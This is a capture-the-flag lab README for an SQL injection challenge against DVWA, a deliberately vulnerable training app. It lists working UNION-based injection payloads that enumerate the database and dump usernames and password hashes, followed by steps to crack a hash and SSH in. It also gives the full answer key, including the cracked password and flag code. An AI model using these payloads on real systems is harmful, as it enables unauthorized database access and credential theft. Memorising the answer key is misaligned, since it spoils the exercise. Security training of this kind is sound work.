Challenge 1: SQL Injection - README

Overview
This challenge focuses on exploiting SQL injection vulnerabilities to extract sensitive user credentials from a database and gain unauthorized access to a target system.

Objective
Use SQL injection techniques to:
Identify the database structure
Extract username and password hashes
Crack the password for Bob Smith's account
Access the target system and retrieve the flag file

Target Information

Web Application: 10.5.5.12 (DVWA - Damn Vulnerable Web Application)
SSH Target: 192.168.0.10
Security Level: Low
Credentials: admin / password

Tools Required

Web browser
Password hash cracking tool (e.g., CrackStation, John the Ripper, Hashcat)
SSH client

Key Steps

Access DVWA and set security level to low
Navigate to SQL Injection module
Use SQL injection payloads to enumerate database structure
Extract user credentials from the database
Crack Bob Smith's password hash
SSH into 192.168.0.10 using recovered credentials
Locate and read the flag file in the home directory

Success Criteria

Successfully extracted database name: dvwa
Identified tables: users and guestbook
Retrieved Bob Smith's credentials (username: smithy, password hash: 5f4dcc3b5aa765d61d8327deb882cf99)
Cracked password: password
Located flag file: my_passwords.txt
Retrieved flag code: 8748wf8J

Key Payloads Used
sql-- Identify database
1' OR 1=1 UNION SELECT 1, DATABASE()#

-- List tables
1' OR 1=1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa' #

-- Extract credentials
1' OR 1=1 UNION SELECT user, password FROM users #
Security Lessons
This challenge demonstrates how SQL injection vulnerabilities can lead to complete database compromise and unauthorized system access. Organizations must implement proper input validation and parameterized queries to prevent such attacks.
